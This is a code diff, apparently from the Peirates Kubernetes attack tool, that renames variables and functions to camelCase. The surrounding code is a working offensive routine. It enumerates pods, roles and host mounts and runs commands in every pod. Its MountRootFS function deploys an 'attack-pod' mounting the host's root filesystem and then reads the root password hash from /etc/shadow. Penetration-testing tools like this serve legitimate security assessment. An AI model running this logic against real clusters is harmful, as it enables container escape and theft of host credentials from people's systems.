@@ -30,8 +30,8 @@ import (
 	kubectl "k8s.io/kubernetes/pkg/kubectl/cmd"
 )
 
-// get_pod_list returns an array of pod names, parsed from "kubectl get pods"
-func get_pod_list(connectionString ServerInfo) []string {
+// getPodList returns an array of pod names, parsed from "kubectl get pods"
+func getPodList(connectionString ServerInfo) []string {
 
 	var pods []string
 
@@ -141,20 +141,20 @@ func canCreatePods(connectionString ServerInfo) bool {
 // inAPod() runs mount on the local system and then checks if output contains kubernetes
 // TODO: Change mount to use a Go function to read /etc/mtab
 func inAPod(connectionString ServerInfo) bool {
-	mount_output_bs, err := exec.Command("mount").Output()
+	mountOutputBs, err := exec.Command("mount").Output()
 	if err != nil {
 		fmt.Println("Checking if we are running in a Pod failed: ", err)
 		return false
 	} else {
-		mount_output := string(mount_output_bs)
-		return strings.Contains(mount_output, "kubernetes")
+		mountOutput := string(mountOutputBs)
+		return strings.Contains(mountOutput, "kubernetes")
 	}
 
 }
 
 // execInAllPods() runs kubeData.command in all running pods
 func execInAllPods(connectionString ServerInfo, command string) {
-	runningPods := get_pod_list(connectionString)
+	runningPods := getPodList(connectionString)
 	for _, execPod := range runningPods {
 		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/bash", "-c", command)
 		if err != nil {
@@ -197,15 +197,15 @@ func randSeq(length int) string {
 	return string(b)
 }
 
-// Used by mount_rootfs
-type Mount_Info struct {
-	yaml_build string
+// Used by mountRootfs
+type MountInfo struct {
+	yamlBuild string
 	image      string
 	namespace  string
 }
 
 // Used for JSON parsing
-type Kube_Roles struct {
+type KubeRoles struct {
 	APIVersion string `json:"apiVersion"`
 	Items      []struct {
 		APIVersion string `json:"apiVersion"`
@@ -235,7 +235,7 @@ type Kube_Roles struct {
 }
 
 // Populated by GetPodsInfo (JSON parsing from kubectl get pods)
-type Pod_Details struct {
+type PodDetails struct {
 	APIVersion string `json:"apiVersion"`
 	Items      []struct {
 		APIVersion string `json:"apiVersion"`
@@ -346,8 +346,8 @@ type Pod_Details struct {
 	} `json:"metadata"`
 }
 
-// GetPodsInfo() gets details for all pods in json output and stores in Pod_Details struct
-func GetPodsInfo(connectionString ServerInfo, podDetails *Pod_Details) {
+// GetPodsInfo() gets details for all pods in json output and stores in PodDetails struct
+func GetPodsInfo(connectionString ServerInfo, podDetails *PodDetails) {
 	fmt.Println("+ Getting details for all pods")
 	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
 	if err != nil {
@@ -362,7 +362,7 @@ func GetPodsInfo(connectionString ServerInfo, podDetails *Pod_Details) {
 }
 
 // GetHostMountPoints prints all pods' host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
-func GetHostMountPoints(podInfo Pod_Details) {
+func GetHostMountPoints(podInfo PodDetails) {
 	fmt.Println("+ Getting all host mount points")
 	for _, item := range podInfo.Items {
 		fmt.Println("+ Host Mount Points for Pod: " + item.Metadata.Name)
@@ -375,7 +375,7 @@ func GetHostMountPoints(podInfo Pod_Details) {
 }
 
 // GetHostMountPointsForPod prints a single pod's host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
-func GetHostMountPointsForPod(podInfo Pod_Details, pod string) {
+func GetHostMountPointsForPod(podInfo PodDetails, pod string) {
 	fmt.Println("+ Getting all Host Mount Points only for pod: " + pod)
 	for _, item := range podInfo.Items {
 		if item.Metadata.Name == pod {
@@ -389,8 +389,8 @@ func GetHostMountPointsForPod(podInfo Pod_Details, pod string) {
 }
 
 // GetRoles() enumerates all roles in use on the cluster (in the default namespace).
-// It parses all roles into a Kube_Roles object.
-func GetRoles(connectionString ServerInfo, kubeRoles *Kube_Roles) {
+// It parses all roles into a KubeRoles object.
+func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
 	fmt.Println("+ Getting all Roles")
 	rolesOut, _, err := runKubectlSimple(connectionString, "get", "role", "-o", "json")
 	if err != nil {
@@ -405,34 +405,34 @@ func GetRoles(connectionString ServerInfo, kubeRoles *Kube_Roles) {
 	}
 }
 
-func Mount_RootFS(all_pods_listme []string, connectionString ServerInfo) {
-	var Mount_InfoVars = Mount_Info{}
-	// fmt.Println("DEBUG: grabbing image from pod: ", string(all_pods_listme[3]))
+func MountRootFS(allPodsListme []string, connectionString ServerInfo) {
+	var MountInfoVars = MountInfo{}
+	// fmt.Println("DEBUG: grabbing image from pod: ", string(allPodsListme[3]))
 	//Get pods
-	//# Get the first pod from all_pod_listme
-	//pod_to_examine = all_pod_listme[0]
+	//# Get the first pod from allPodListme
+	//podToExamine = allPodListme[0]
 
 	//# Run a kubectl command to get YAML
-	//yaml_output = kubectl -n ...  --token .... --ca ... get pod $pod_to_examine -o yaml
+	//yamlOutput = kubectl -n ...  --token .... --ca ... get pod $podToExamine -o yaml
 
 	//# Parse yaml output to get the image name
-	//image_name = `grep "- image" yaml_output | awk '{print $3}'`
+	//imageName = `grep "- image" yamlOutput | awk '{print $3}'`
 
 	// We take the most recent deployment's image
 	// TODO: parse this via JSON
 	// TODO: check that image exists / handle failure by trying again with the next youngest deployment's image or a named deployment's image
-	get_images_raw, _, err := runKubectlSimple(connectionString, "get", "deployments", "-o", "wide", "--sort-by", "metadata.creationTimestamp")
+	getImagesRaw, _, err := runKubectlSimple(connectionString, "get", "deployments", "-o", "wide", "--sort-by", "metadata.creationTimestamp")
 
-	get_image_lines := strings.Split(string(get_images_raw), "\n")
-	for _, line := range get_image_lines {
+	getImageLines := strings.Split(string(getImagesRaw), "\n")
+	for _, line := range getImageLines {
 		matched, err := regexp.MatchString(`^\s*$`, line)
 		if err != nil {
 			log.Fatal(err)
 		}
 		if !matched {
 			//added checking to only enumerate running pods
-			Mount_InfoVars.image = strings.Fields(line)[7]
-			fmt.Println("[+] This is the Mount_InfoVars.Image output: ", Mount_InfoVars.image)
+			MountInfoVars.image = strings.Fields(line)[7]
+			fmt.Println("[+] This is the MountInfoVars.Image output: ", MountInfoVars.image)
 		}
 	}
 
@@ -441,10 +441,10 @@ func Mount_RootFS(all_pods_listme []string, connectionString ServerInfo) {
 	}
 
 	//creat random string
-	random_string := randSeq(6)
+	randomString := randSeq(6)
 
 	// Create Yaml File
-	Mount_InfoVars.yaml_build = fmt.Sprintf(`apiVersion: v1
+	MountInfoVars.yamlBuild = fmt.Sprintf(`apiVersion: v1
 kind: Pod
 metadata:
   annotations:
@@ -463,23 +463,23 @@ spec:
   - name: mount-root-into-mnt
     hostPath:
        path: /
-`, random_string, connectionString.Namespace, Mount_InfoVars.image)
+`, randomString, connectionString.Namespace, MountInfoVars.image)
 
 	// Write yaml file out to current directory
-	ioutil.WriteFile("attack-pod.yaml", []byte(Mount_InfoVars.yaml_build), 0700)
+	ioutil.WriteFile("attack-pod.yaml", []byte(MountInfoVars.yamlBuild), 0700)
 
 	_, _, err = runKubectlSimple(connectionString, "apply", "-f", "attack-pod.yaml")
 	if err != nil {
 		log.Fatal(err)
 	} else {
-		attack_pod_name := "attack-pod-" + random_string
-		println("Executing code in " + attack_pod_name + " to get its underlying host's root password hash")
+		attackPodName := "attack-pod-" + randomString
+		println("Executing code in " + attackPodName + " to get its underlying host's root password hash")
 		time.Sleep(2 * time.Second)
-		shadow_file_bs, _, err := runKubectlSimple(connectionString, "exec", "-it", attack_pod_name, "grep", "root", "/root/etc/shadow")
+		shadowFileBs, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
 		if err != nil {
 			log.Fatal(err)
 		} else {
-			println(string(shadow_file_bs))
+			println(string(shadowFileBs))
 		}
 	}
 	//out, err = exec.Command("").Output()
@@ -497,8 +497,8 @@ func PeiratesMain() {
 	// default values
 	connectionString := ParseLocalServerInfo()
 	cmdOpts := CommandLineOptions{connectionConfig: connectionString}
-	var kubeRoles Kube_Roles
-	var podInfo Pod_Details
+	var kubeRoles KubeRoles
+	var podInfo PodDetails
 	//kubeData.arg =""
 	//kubeData.list = {}
 
@@ -546,27 +546,27 @@ func PeiratesMain() {
 		println("- You are not in a Kubernetes pod.")
 	}
 
-	all_pods := get_pod_list(connectionString)
+	allPods := getPodList(connectionString)
 
 	GetRoles(connectionString, &kubeRoles)
 
 	GetPodsInfo(connectionString, &podInfo)
 	GetHostMountPoints(podInfo)
 	GetHostMountPointsForPod(podInfo, "attack-daemonset-6fmjc")
-	for _, pod := range all_pods {
+	for _, pod := range allPods {
 		// JAY / TODO: Put me back
 		println("Checking out hostname for: " + pod)
 		print(getHostname(connectionString, pod))
 	}
 
-	pod_creation := canCreatePods(connectionString)
-	if pod_creation {
+	podCreation := canCreatePods(connectionString)
+	if podCreation {
 		println("+ This token can create pods on the cluster")
 	} else {
 		println(" This token cannot create pods on the cluster")
 	}
 
-	Mount_RootFS(all_pods, connectionString)
+	MountRootFS(allPods, connectionString)
 
 	if cmdOpts.commandToRunInPods != "" {
 		if len(cmdOpts.podsToRunTheCommandIn) > 0 {
